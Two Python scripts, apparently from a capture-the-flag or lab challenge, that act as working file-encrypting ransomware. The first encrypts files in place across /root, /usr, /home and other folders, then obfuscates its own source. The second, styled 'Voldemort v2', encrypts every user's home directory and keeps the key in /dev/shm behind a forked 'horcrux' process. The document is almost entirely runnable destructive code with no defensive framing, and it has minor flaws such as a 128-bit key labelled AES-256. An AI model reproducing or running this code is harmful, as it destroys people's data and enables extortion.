import os
import sys
import base64
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from multiprocessing import Process

def generate_key():
    salt = os.urandom(16)
    password = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key, salt, password

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

def process_files(directories, excluded_files, key):
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file not in excluded_files:
                        encrypt_file(os.path.join(root, file), key)

def hide_key_file(key_file_path):
    while True:
        pass

def reverse_and_obfuscate_script(script_path):
    with open(script_path, "r") as f:
        script = f.read()
    reversed_script = script[::-1]
    shuffled = list(reversed_script)
    random.shuffle(shuffled)
    index_map = {i: shuffled.index(char) for i, char in enumerate(reversed_script)}
    obfuscated_script = "".join(shuffled)
    encoded_script = base64.b64encode(obfuscated_script.encode()).decode()
    with open(script_path, "w") as f:
        f.write(encoded_script + "-f{" + ",".join(map(str, index_map.values())) + "}")

def main():
    key, salt, password = generate_key()
    key_file_path = "keyfile"
    excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
    target_folders = ["/root", "/usr", "/home", "/Documents", "/Downloads", "/var/gui"]
    
    with open(key_file_path, "wb") as f:
        f.write(key)
    
    parent_process = Process(target=hide_key_file, args=(key_file_path,))
    parent_process.start()
    
    process_files(target_folders, excluded_files, key)
    reverse_and_obfuscate_script(sys.argv[0])
    
    with open("/tmp/.flag.txt", "w") as f:
        f.write("Challenge Completed")

if __name__ == "__main__":
    main()



```
import os
import base64
import base62
import random
import signal
import string
import subprocess
import threading
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# === CONFIG ===
KEY_FILE = "/tmp/.key.horcrux"
RAM_KEY_PATH = "/dev/shm/.key.horcrux"
KEY_LENGTH = 16  # 128 bits
PROTECTED_EXT = {'.sh', '.conf', '.key', '.horcrux'}

# === KEY GENERATION ===
def generate_key():
    return get_random_bytes(KEY_LENGTH)

def save_key_to_ram(key):
    with open(RAM_KEY_PATH, 'wb') as f:
        f.write(key)
    print(f"[+] Key stored in RAM at {RAM_KEY_PATH}")

def restore_key_file():
    if os.path.exists(RAM_KEY_PATH):
        with open(RAM_KEY_PATH, 'rb') as src, open("/tmp/.horcrux", 'wb') as dest:
            dest.write(src.read())
        print("[+] Key restored to /tmp/.horcrux")
    else:
        print("[-] RAM key not found.")

# === AES ENCRYPTION ===
def pad(data):
    return data + b' ' * (AES.block_size - len(data) % AES.block_size)

def encrypt_file(file_path, key):
    if any(file_path.endswith(ext) for ext in PROTECTED_EXT):
        return
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    encrypted_data = cipher.iv + cipher.encrypt(pad(data))
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

# === HOME DIR TARGETING ===
def get_user_dirs():
    base = "/home"
    return [os.path.join(base, d) for d in os.listdir(base) if os.path.isdir(os.path.join(base, d))]

def encrypt_directories(paths, key):
    for path in paths:
        print(f"[+] Encrypting {path}")
        for root, dirs, files in os.walk(path):
            for file in files:
                try:
                    full_path = os.path.join(root, file)
                    encrypt_file(full_path, key)
                except Exception as e:
                    print(f"[-] Failed to encrypt {full_path}: {e}")

# === HORCRUX PROCESS ===
def horcrux_guard():
    def handle_signal(signum, frame):
        print("[*] horcrux killed, restoring key...")
        restore_key_file()
        exit(0)

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)
    print("[+] horcrux process running... (kill me to restore key)")
    while True:
        time.sleep(1)

def spawn_horcrux():
    pid = os.fork()
    if pid == 0:
        horcrux_guard()
    else:
        return pid

# === MAIN ===
def main():
    print("[*] Voldemort v2: AES-256 File Encryption in Action...")
    user_dirs = get_user_dirs()
    key = generate_key()
    save_key_to_ram(key)
    horcrux_pid = spawn_horcrux()
    encrypt_directories(user_dirs, key)
    print(f"[+] Encryption complete. horcrux PID: {horcrux_pid}")

if __name__ == "__main__":
    main()

```
